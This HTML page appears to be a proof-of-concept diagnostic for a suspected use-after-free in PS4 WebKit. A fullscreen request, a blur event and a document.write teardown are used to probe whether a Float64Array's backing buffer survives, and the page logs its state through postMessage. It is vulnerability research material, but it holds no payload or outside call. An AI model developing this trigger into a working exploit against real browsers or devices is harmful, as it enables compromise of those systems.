<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit Float64Array UAF Diagnostic</title>
<style>
body { font-family: monospace; }
iframe { width: 100%; height: 300px; border: 1px solid #000; }
pre { background: #eee; padding: 10px; }
</style>
</head>
<body>

<h2>PARENT LOGGER</h2>
<pre id="parentlog"></pre>

<iframe id="testframe"></iframe>

<script>
const plog = document.getElementById('parentlog');

function log(msg) {
    plog.textContent += msg + "\n";
}

window.addEventListener("message", e => {
    log("[MSG] " + e.data);
});

log("[PARENT] Loaded");

const iframe = document.getElementById("testframe");
iframe.srcdoc = `
<!DOCTYPE html>
<html>
<body>
<h3>IFRAME TEST</h3>
<button onclick="start()">START</button>
<pre id="log"></pre>

<script>
let f64, buf;

function send(m) {
    parent.postMessage(m, "*");
}

function dump(tag) {
    try {
        send("[" + tag + "]");
        send(" length=" + f64.length);
        send(" byteLength=" + f64.byteLength);
        send(" buffer.byteLength=" + f64.buffer.byteLength);
        send(" f64[0]=" + f64[0]);
    } catch (e) {
        send(" EXCEPTION: " + e);
    }
}

function start() {
    send("[START] clicked");

    buf = new ArrayBuffer(0x40);
    f64 = new Float64Array(buf);
    f64[0] = 13.37;

    dump("BEFORE FULLSCREEN");

    document.documentElement.webkitRequestFullscreen();

    window.onblur = () => {
        send("[EVENT] onblur");

        dump("AFTER BLUR / BEFORE WRITE");

        send("[ACTION] document.write teardown");

        document.open();
        document.write("<html><body><h1>teardown</h1></body></html>");
        document.close();
    };
}
<\/script>
</body>
</html>
`;
</script>

</body>
</html>
